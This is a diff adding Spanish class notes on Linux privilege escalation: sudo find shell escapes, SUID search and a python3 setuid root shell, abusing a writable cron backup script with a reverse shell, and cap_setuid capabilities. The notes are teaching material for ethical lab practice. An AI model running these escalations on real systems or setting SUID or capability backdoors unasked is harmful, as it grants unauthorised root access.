@@ -892,3 +892,99 @@ sudo proxychains nikto -h <HOST>
    - Ejecutamos los comandos sugeridos en GTFOBins para aprovechar la vulnerabilidad.
 
 ---
+
+# Notas de la Clase (20-01-2025)
+
+## Escalación de Privilegios con Sudo
+
+### Comando Básico
+Para escalar privilegios con `sudo`, puedes ejecutar el siguiente comando:
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+Esto te otorgará acceso como root.
+
+### Diferencias entre `sudo` y `SUID`
+Es fundamental comprender las diferencias entre `sudo` (permite ejecutar comandos con privilegios elevados temporalmente) y los permisos `SUID` (que ejecutan binarios con los privilegios del propietario).
+
+### Configuración de SUID
+Puedes asignar un permiso SUID a un archivo con:
+```bash
+chmod 4755 /usr/bin/python3
+```
+
+### Búsqueda de Archivos con Permisos SUID
+Para localizar archivos con permisos SUID en el sistema:
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+### Escalación con Python3
+Si encuentras un archivo SUID asociado a Python3, puedes escalar privilegios ejecutando:
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+---
+
+## Cron Jobs
+
+### Análisis Inicial
+Comienza obteniendo información del sistema:
+```bash
+uname -a
+```
+También puedes usar herramientas como `linpeas` para automatizar el proceso de análisis.
+
+### Identificar Tareas Programadas
+Localiza las tareas programadas revisando el archivo `/etc/crontab`:
+```bash
+cat /etc/crontab
+```
+
+### Caso Práctico
+En este ejemplo, encontramos una tarea programada (cron job) que ejecuta un archivo de respaldo de un usuario (por ejemplo, `karen`). Si este archivo es editable por el usuario actual, podemos modificarlo para incluir una reverse shell o cualquier otro payload malicioso. Una vez hecho esto, solo hay que esperar a que el cron job se ejecute automáticamente con privilegios elevados.
+
+---
+
+## Escalación de Privilegios con Capabilities
+
+### Comandos Iniciales
+Comienza analizando el sistema:
+```bash
+uname -a
+sudo -l
+```
+
+Busca binarios con permisos SUID:
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Si encuentras una vulnerabilidad utilizando `find`, puedes explotarla con:
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+### Configuración de Capabilities
+Asigna la capability `cap_setuid` al binario de Python3 (o su versión instalada):
+```bash
+setcap cap_setuid+ep /usr/bin/python3
+```
+
+### Verificar Capabilities
+Para buscar capabilities configuradas:
+```bash
+getcap -r / 2>/dev/null
+```
+
+### Escalación con Python3
+Ejecuta el siguiente comando para escalar privilegios:
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+---
+
+## Nota Final
+Revisa los últimos 30 minutos de la clase para consolidar conceptos clave. Asegúrate de practicar cada uno de estos métodos en un entorno controlado y ético.
